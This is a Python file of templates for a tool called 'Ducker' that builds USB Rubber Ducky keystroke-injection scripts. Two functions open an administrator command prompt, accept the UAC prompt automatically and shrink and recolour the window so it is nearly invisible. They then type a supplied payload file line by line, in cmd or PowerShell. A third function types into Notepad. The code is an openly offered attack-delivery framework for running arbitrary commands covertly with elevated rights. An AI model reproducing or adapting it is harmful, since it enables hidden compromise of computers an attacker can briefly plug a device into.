### =========================================================================== ###
### Here is some templates the Ducker uses, feel free to fuck around with em :P ###
### =========================================================================== ###


def cmd(payload, delay):
    instructions = []

    # Open cmd as Admin
    instructions.append("DELAY 1000")
    instructions.append("GUI r")
    instructions.append("DELAY 500")
    instructions.append("STRING powershell Start-Process cmd -Verb runAs")
    instructions.append("ENTER")
    instructions.append("DELAY 2000")
    instructions.append("ALT y")
    instructions.append("DELAY 1000")
    # Make the window suuuuper small
    instructions.append("STRING mode con:cols=18 lines=1")
    instructions.append("ENTER")
    instructions.append("STRING color FE")
    instructions.append("ENTER")
    # Execute the payload
    with open(payload, 'r') as o:
        for line in o.readlines():
            if line[-1:] == '\n':
                instructions.append("STRING " + line[:-1])
            else:
                instructions.append("STRING " + line)
            instructions.append("ENTER")
            instructions.append("DELAY " + delay)

    return instructions

def powershell(payload, delay):
    instructions = []

    # Open cmd as Admin
    instructions.append("DELAY 1000")
    instructions.append("GUI r")
    instructions.append("DELAY 500")
    instructions.append("STRING powershell Start-Process cmd -Verb runAs")
    instructions.append("ENTER")
    instructions.append("DELAY 2000")
    instructions.append("ALT y")
    instructions.append("DELAY 1000")
    # Make the window suuuuper small
    instructions.append("STRING mode con:cols=18 lines=1")
    instructions.append("ENTER")
    instructions.append("STRING color FE")
    instructions.append("ENTER")
    # Load Powershell Interpreter
    instructions.append("STRING powershell")
    instructions.append("ENTER")
    instructions.append("DELAY 500")
    # Execute the payload
    with open(payload, 'r') as o:
        for line in o.readlines():
            if line[-1:] == '\n':
                instructions.append("STRING " + line[:-1])
            else:
                instructions.append("STRING " + line)
            instructions.append("ENTER")
            instructions.append("DELAY " + delay)

    return instructions

def notepad(payload, delay):
    instructions = []

    # Open Notepad
    instructions.append("DELAY 1000")
    instructions.append("GUI r")
    instructions.append("DELAY 500")
    instructions.append("STRING notepad")
    instructions.append("ENTER")
    instructions.append("DELAY 1000")
    # Execute the payload
    with open(payload, 'r') as o:
        for line in o.readlines():
            if line[-1:] == '\n':
                instructions.append("STRING " + line[:-1])
            else:
                instructions.append("STRING " + line)
            instructions.append("ENTER")
            instructions.append("DELAY " + delay)

    return instructions
